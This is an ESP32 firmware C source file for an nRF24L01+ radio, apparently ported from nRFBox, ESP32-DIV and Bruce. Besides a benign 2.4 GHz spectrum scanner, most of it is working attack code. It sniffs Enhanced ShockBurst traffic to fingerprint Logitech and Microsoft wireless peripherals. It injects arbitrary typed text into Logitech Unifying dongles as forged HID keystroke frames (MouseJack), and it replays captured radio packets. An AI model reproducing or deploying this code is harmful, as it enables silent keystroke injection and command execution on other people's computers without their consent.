/* nRF24L01+ ported apps: 2.4 GHz scanner/spectrum, ESB promiscuous sniffer +
 * MouseJack fingerprint/inject, ESB replay. Single radio, polled (no IRQ).
 * Ported from nRFBox (ism.cpp), ESP32-DIV (bluetooth.cpp ESB/MouseJack) and
 * Bruce (modules/NRF24/nrf_mousejack.cpp). See docs/radio_apps_port.md. */

#include "nrf24_apps.h"
#include "nrf24.h"
#include "nrf24_jammer.h"

#include <string.h>
#include <stdio.h>
#include <ctype.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_timer.h"
#include "esp_rom_sys.h"
#include "driver/gpio.h"

/* ---- shared task/stop state (mirrors the jammer's model) ---- */
static volatile bool s_apps_stop = true;
static volatile bool s_apps_running = false;
static TaskHandle_t  s_apps_task = NULL;
static int s_scan_lo = 0, s_scan_hi = 125;

/* ---- last ESB capture stored for replay ---- */
static uint8_t s_esb_addr[5];
static uint8_t s_esb_payload[32];
static int     s_esb_plen = 0;
static uint8_t s_esb_ch = 0;
static bool    s_esb_have = false;

/* ---- low-level helpers over the driver ---- */
static void nrf_ce(nrf24_device_t *d, int level) { gpio_set_level((gpio_num_t)d->ce_pin, level); }

static void nrf_read_payload(nrf24_device_t *d, uint8_t *buf, int len) {
    uint8_t tx[33], rx[33];
    tx[0] = R_RX_PAYLOAD;
    for (int i = 1; i <= len; i++) tx[i] = 0xFF;
    nrf24_spi_trx(d, tx, rx, (uint8_t)(len + 1), nrf24_TIMEOUT);
    memcpy(buf, rx + 1, len);
}
static void nrf_write_payload(nrf24_device_t *d, const uint8_t *buf, int len) {
    uint8_t tx[33];
    tx[0] = W_TX_PAYLOAD;
    memcpy(tx + 1, buf, len);
    nrf24_spi_trx(d, tx, NULL, (uint8_t)(len + 1), nrf24_TIMEOUT);
}
/* one-shot no-ACK TX: load FIFO, pulse CE >10us, settle */
static void nrf_tx_one(nrf24_device_t *d, const uint8_t *buf, int len) {
    nrf24_flush_tx(d);
    nrf_write_payload(d, buf, len);
    nrf24_write_reg(d, REG_STATUS, 0x70);
    nrf_ce(d, 1);
    esp_rom_delay_us(15);
    nrf_ce(d, 0);
    esp_rom_delay_us(150);
}

/* ================= #1/#2 scanner / spectrum analyzer ===================== */
/* Carrier-detect via RPD (0x09 bit0) after a short RX dwell per channel. */
static void nrf_scan_config(nrf24_device_t *d) {
    nrf_ce(d, 0);
    nrf24_write_reg(d, REG_CONFIG, 0x03);   /* PWR_UP | PRIM_RX */
    esp_rom_delay_us(5000);
    nrf24_write_reg(d, REG_EN_AA, 0x00);
    nrf24_write_reg(d, REG_RF_SETUP, 0x0F); /* 2 Mbps, PA max, LNA -> widest RX */
    nrf24_flush_rx(d);
}
static int nrf_rpd(nrf24_device_t *d, uint8_t ch) {
    nrf_ce(d, 0);
    nrf24_write_reg(d, REG_RF_CH, ch);
    nrf24_write_reg(d, REG_CONFIG, 0x03);
    nrf_ce(d, 1);
    esp_rom_delay_us(200);              /* > Tstby2a 130us + RX settle */
    nrf_ce(d, 0);
    uint8_t rpd = 0;
    nrf24_read_reg(d, 0x09, &rpd, 1);   /* RPD/CD */
    return rpd & 0x01;
}

static void scan_task(void *pv) {
    (void)pv;
    static const char HEX[] = "0123456789abcdef";
    static uint8_t hits[126];
    static char hexbuf[253];
    nrf24_device_t *d = nrf24_jammer_device();
    int lo = s_scan_lo, hi = s_scan_hi;
    if (lo < 0) lo = 0;
    if (hi > 125) hi = 125;
    if (hi < lo) { int t = lo; lo = hi; hi = t; }
    int n = hi - lo + 1;
    const int SAMPLES = 16;
    nrf_scan_config(d);
    printf("[NRF_SPECTRUM_START] lo=%d hi=%d n=%d\n", lo, hi, n); fflush(stdout);
    s_apps_running = true;
    while (!s_apps_stop) {
        int peak_ch = lo, peak_hits = -1;
        for (int i = 0; i < n && !s_apps_stop; i++) {
            int h = 0;
            for (int s = 0; s < SAMPLES; s++) h += nrf_rpd(d, (uint8_t)(lo + i));
            hits[i] = (uint8_t)(h * 255 / SAMPLES);
            if (h > peak_hits) { peak_hits = h; peak_ch = lo + i; }
        }
        for (int i = 0; i < n; i++) { hexbuf[2*i] = HEX[hits[i] >> 4]; hexbuf[2*i+1] = HEX[hits[i] & 0xF]; }
        hexbuf[2*n] = 0;
        int ppct = peak_hits >= 0 ? peak_hits * 100 / SAMPLES : 0;
        printf("[NRF_SPECTRUM] lo=%d n=%d peak=%d ppct=%d data=%s\n", lo, n, peak_ch, ppct, hexbuf);
        printf("[NRF_SCAN_TOP] ch=%d mhz=%d pct=%d\n", peak_ch, 2400 + peak_ch, ppct);
        fflush(stdout);
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    nrf24_set_idle(d);
    s_apps_running = false;
    s_apps_task = NULL;
    vTaskDelete(NULL);
}

/* ================= #5 ESB sniffer + MouseJack fingerprint ================= */
static uint16_t mj_crc_update(uint16_t crc, uint8_t b, int bits) {
    crc ^= (uint16_t)b << 8;
    while (bits--) crc = (crc & 0x8000) ? (uint16_t)((crc << 1) ^ 0x1021) : (uint16_t)(crc << 1);
    return crc;
}
/* Recover a real 5-byte ESB address + payload from a 2-byte-promiscuous capture
 * by validating the 9-bit-PCF-shifted CRC16-CCITT (Bruce mj_fingerprint). */
static bool mj_fingerprint(const uint8_t *in, int size, uint8_t out_addr[5],
                           uint8_t *out_payload, int *out_plen) {
    uint8_t buf[32];
    for (int offset = 0; offset < 2; offset++) {
        memcpy(buf, in, size);
        if (offset == 1) {
            for (int x = size - 1; x >= 1; x--) buf[x] = (uint8_t)((buf[x-1] << 7) | (buf[x] >> 1));
            buf[0] = (uint8_t)(buf[0] >> 1);
        }
        int plen = buf[5] >> 2;
        if (plen == 0 || plen > size - 9) continue;
        uint16_t crcGiven = (uint16_t)((buf[6+plen] << 9) | (buf[7+plen] << 1));
        crcGiven = (uint16_t)((crcGiven << 8) | (crcGiven >> 8));
        if (buf[8+plen] & 0x80) crcGiven |= 0x0100;
        uint16_t crc = 0xFFFF;
        for (int x = 0; x < 6 + plen; x++) crc = mj_crc_update(crc, buf[x], 8);
        crc = mj_crc_update(crc, buf[6+plen] & 0x80, 1);
        crc = (uint16_t)((crc << 8) | (crc >> 8));
        if (crc != crcGiven) continue;
        memcpy(out_addr, buf, 5);
        for (int x = 0; x < plen; x++)
            out_payload[x] = (uint8_t)(((buf[6+x] << 1) & 0xFF) | (buf[7+x] >> 7));
        *out_plen = plen;
        return true;
    }
    return false;
}
static const char *mj_classify(const uint8_t *p, int len) {
    if (len == 19 && p[0] == 0x08 && p[6] == 0x40) return "microsoft";
    if (len == 19 && p[0] == 0x0A) return "ms_crypt";
    if (len == 10 && p[0] == 0x00 && (p[1] == 0xC2 || p[1] == 0x4F)) return "logitech";
    if (len == 22 && p[0] == 0x00 && p[1] == 0xD3) return "logitech";
    if (len == 5  && p[0] == 0x00 && p[1] == 0x40) return "logitech";
    return "esb";
}
static void esb_config(nrf24_device_t *d, uint8_t rf_setup) {
    static const uint8_t p0[2] = {0x55, 0x55};
    static const uint8_t p1[2] = {0xAA, 0xAA};
    nrf_ce(d, 0);
    nrf24_write_reg(d, REG_CONFIG, 0x00);
    nrf24_write_reg(d, REG_CONFIG, 0x03);   /* PWR_UP | PRIM_RX, EN_CRC=0 */
    esp_rom_delay_us(2000);
    nrf24_write_reg(d, REG_EN_AA, 0x00);
    nrf24_write_reg(d, REG_SETUP_RETR, 0x00);
    nrf24_write_reg(d, REG_SETUP_AW, 0x00); /* illegal 2-byte width = fake preamble */
    nrf24_write_reg(d, REG_RF_SETUP, rf_setup);
    nrf24_write_buf_reg(d, REG_RX_ADDR_P0, (uint8_t *)p0, 2);
    nrf24_write_buf_reg(d, REG_RX_ADDR_P1, (uint8_t *)p1, 2);
    nrf24_write_reg(d, REG_RX_ADDR_P2, 0xA0);
    nrf24_write_reg(d, REG_RX_ADDR_P3, 0xAB);
    nrf24_write_reg(d, REG_RX_ADDR_P4, 0xAC);
    nrf24_write_reg(d, REG_RX_ADDR_P5, 0xAD);
    nrf24_write_reg(d, REG_EN_RXADDR, 0x3F);
    for (uint8_t r = RX_PW_P0; r <= RX_PW_P5; r++) nrf24_write_reg(d, r, 32);
    nrf24_flush_rx(d);
}
static void esb_task(void *pv) {
    (void)pv;
    nrf24_device_t *d = nrf24_jammer_device();
    static uint8_t seen[24][5]; int nseen = 0;
    const uint8_t rates[2] = {0x0F, 0x07};   /* 2 Mbps then 1 Mbps */
    printf("[NRF_ESB_START]\n"); fflush(stdout);
    s_apps_running = true;
    while (!s_apps_stop) {
        for (int ri = 0; ri < 2 && !s_apps_stop; ri++) {
            esb_config(d, rates[ri]);
            for (int ch = 2; ch <= 84 && !s_apps_stop; ch++) {
                nrf_ce(d, 0);
                nrf24_write_reg(d, REG_RF_CH, (uint8_t)ch);
                nrf24_flush_rx(d);
                nrf_ce(d, 1);
                for (int t = 0; t < 6 && !s_apps_stop; t++) {
                    esp_rom_delay_us(500);
                    if (!(nrf24_status(d) & 0x40)) continue;
                    uint8_t raw[32];
                    nrf_read_payload(d, raw, 32);
                    nrf24_write_reg(d, REG_STATUS, 0x70);
                    uint8_t addr[5], pl[32]; int plen = 0;
                    if (!mj_fingerprint(raw, 32, addr, pl, &plen)) continue;
                    bool dup = false;
                    for (int k = 0; k < nseen; k++)
                        if (memcmp(seen[k], addr, 5) == 0) { dup = true; break; }
                    if (dup) continue;
                    if (nseen < 24) memcpy(seen[nseen++], addr, 5);
                    memcpy(s_esb_addr, addr, 5);
                    memcpy(s_esb_payload, pl, plen);
                    s_esb_plen = plen; s_esb_ch = (uint8_t)ch; s_esb_have = true;
                    printf("[NRF_ESB] addr=%02X:%02X:%02X:%02X:%02X ch=%d mhz=%d rate=%s len=%d dev=%s\n",
                           addr[0], addr[1], addr[2], addr[3], addr[4], ch, 2400 + ch,
                           ri == 0 ? "2M" : "1M", plen, mj_classify(pl, plen));
                    fflush(stdout);
                }
                nrf_ce(d, 0);
            }
        }
        vTaskDelay(1);
    }
    nrf24_set_idle(d);
    s_apps_running = false;
    s_apps_task = NULL;
    vTaskDelete(NULL);
}

/* ================= #6 MouseJack Logitech Unifying inject ================== */
/* ASCII -> USB HID (modifier, keycode). Covers a-z, A-Z, 0-9, space, common. */
static bool ascii_to_hid(char c, uint8_t *mod, uint8_t *key) {
    *mod = 0; *key = 0;
    if (c >= 'a' && c <= 'z') { *key = (uint8_t)(0x04 + (c - 'a')); return true; }
    if (c >= 'A' && c <= 'Z') { *mod = 0x02; *key = (uint8_t)(0x04 + (c - 'A')); return true; }
    if (c >= '1' && c <= '9') { *key = (uint8_t)(0x1E + (c - '1')); return true; }
    if (c == '0') { *key = 0x27; return true; }
    switch (c) {
        case ' ': *key = 0x2C; return true;
        case '\n': *key = 0x28; return true;
        case '\t': *key = 0x2B; return true;
        case '-': *key = 0x2D; return true;
        case '=': *key = 0x2E; return true;
        case '.': *key = 0x37; return true;
        case ',': *key = 0x36; return true;
        case '/': *key = 0x38; return true;
        case ';': *key = 0x33; return true;
        case '!': *mod = 0x02; *key = 0x1E; return true;
        case '@': *mod = 0x02; *key = 0x1F; return true;
        case '_': *mod = 0x02; *key = 0x2D; return true;
        default: return false;
    }
}
static uint8_t logi_cksum(const uint8_t *f, int len) {
    unsigned s = 0;
    for (int i = 0; i < len - 1; i++) s += f[i];
    return (uint8_t)((0x100 - (s & 0xFF)) & 0xFF);
}
static void mj_tx_config(nrf24_device_t *d, const uint8_t addr[5], int ch) {
    nrf_ce(d, 0);
    nrf24_write_buf_reg(d, REG_TX_ADDR, (uint8_t *)addr, 5);
    nrf24_write_buf_reg(d, REG_RX_ADDR_P0, (uint8_t *)addr, 5);
    nrf24_write_reg(d, REG_SETUP_AW, 0x03);
    nrf24_write_reg(d, REG_EN_AA, 0x00);
    nrf24_write_reg(d, REG_EN_RXADDR, 0x01);
    nrf24_write_reg(d, REG_SETUP_RETR, 0x00);
    nrf24_write_reg(d, REG_RF_SETUP, 0x0F);
    nrf24_write_reg(d, REG_RF_CH, (uint8_t)ch);
    nrf24_write_reg(d, REG_CONFIG, 0x0E);   /* EN_CRC | CRCO(2-byte) | PWR_UP, PRIM_TX */
    esp_rom_delay_us(2000);
    nrf24_flush_tx(d);
}
static void mj_send_on_channels(nrf24_device_t *d, const uint8_t addr[5], int ch, const uint8_t *f, int len) {
    int chans[3] = { ch, (ch + 1) % 84, (ch + 83) % 84 };
    for (int i = 0; i < 3; i++) { mj_tx_config(d, addr, chans[i]); nrf_tx_one(d, f, len); }
}
bool nrf24_apps_mj_inject(const char *addr_hex, int ch, const char *text) {
    if (!nrf24_jammer_ready() && !nrf24_jammer_init()) { printf("[NRF_MJ_ERR] no radio\n"); fflush(stdout); return false; }
    nrf24_apps_stop();
    nrf24_device_t *d = nrf24_jammer_device();
    uint8_t addr[5];
    if (strlen(addr_hex) < 10) { printf("[NRF_MJ_ERR] bad addr\n"); fflush(stdout); return false; }
    for (int i = 0; i < 5; i++) { unsigned b; sscanf(addr_hex + 2*i, "%2x", &b); addr[i] = (uint8_t)b; }
    /* Logitech wake so a sleeping dongle is listening */
    uint8_t wake[10] = {0x00,0x4F,0x00,0x04,0xB0,0x10,0x00,0x00,0x00,0xED};
    mj_send_on_channels(d, addr, ch, wake, 10);
    esp_rom_delay_us(12000);
    int frames = 0;
    for (const char *p = text; *p; p++) {
        uint8_t mod, key;
        if (!ascii_to_hid(*p, &mod, &key)) continue;
        uint8_t down[10] = {0x00, 0xC1, mod, key, 0,0,0,0,0, 0};
        down[9] = logi_cksum(down, 10);
        uint8_t up[10]   = {0x00, 0xC1, 0x00, 0x00, 0,0,0,0,0, 0};
        up[9] = logi_cksum(up, 10);
        mj_send_on_channels(d, addr, ch, down, 10);
        esp_rom_delay_us(10000);
        mj_send_on_channels(d, addr, ch, up, 10);
        esp_rom_delay_us(10000);
        frames += 2;
    }
    nrf24_set_idle(d);
    printf("[NRF_MJ_TX] frames=%d addr=%02X:%02X:%02X:%02X:%02X ch=%d\n",
           frames, addr[0],addr[1],addr[2],addr[3],addr[4], ch);
    fflush(stdout);
    return true;
}

/* ================= #7 ESB replay ========================================= */
bool nrf24_apps_esb_replay(void) {
    if (!s_esb_have) { printf("[NRF_ESB_TX] err=nocap\n"); fflush(stdout); return false; }
    if (!nrf24_jammer_ready() && !nrf24_jammer_init()) { printf("[NRF_ESB_TX] err=noradio\n"); fflush(stdout); return false; }
    nrf24_apps_stop();
    nrf24_device_t *d = nrf24_jammer_device();
    for (int burst = 0; burst < 4; burst++) {
        int ch = (burst == 1) ? (s_esb_ch + 1) % 84 : s_esb_ch;
        mj_tx_config(d, s_esb_addr, ch);
        nrf_tx_one(d, s_esb_payload, s_esb_plen);
        vTaskDelay(pdMS_TO_TICKS(8));
    }
    nrf24_set_idle(d);
    printf("[NRF_ESB_TX] ok=1 addr=%02X:%02X:%02X:%02X:%02X ch=%d len=%d\n",
           s_esb_addr[0],s_esb_addr[1],s_esb_addr[2],s_esb_addr[3],s_esb_addr[4],
           s_esb_ch, s_esb_plen);
    fflush(stdout);
    return true;
}

/* ================= lifecycle ============================================= */
static bool apps_start_task(TaskFunction_t fn, const char *name) {
    if (!nrf24_jammer_ready() && !nrf24_jammer_init()) return false;
    nrf24_apps_stop();
    s_apps_stop = false;
    BaseType_t ok = xTaskCreate(fn, name, 4096, NULL, 1, &s_apps_task);
    if (ok != pdPASS) { s_apps_task = NULL; s_apps_stop = true; return false; }
    return true;
}
bool nrf24_apps_scan_start(int lo, int hi) {
    s_scan_lo = lo; s_scan_hi = hi;
    return apps_start_task(scan_task, "nrf_scan");
}
bool nrf24_apps_esb_start(void) { return apps_start_task(esb_task, "nrf_esb"); }

void nrf24_apps_stop(void) {
    if (!s_apps_running && s_apps_task == NULL) return;
    s_apps_stop = true;
    for (int i = 0; i < 60 && s_apps_task != NULL; i++) vTaskDelay(pdMS_TO_TICKS(25));
    if (s_apps_task != NULL) {
        vTaskDelete(s_apps_task);
        s_apps_task = NULL;
        s_apps_running = false;
    }
    if (nrf24_jammer_ready()) nrf24_set_idle(nrf24_jammer_device());
}
bool nrf24_apps_is_running(void) { return s_apps_running; }
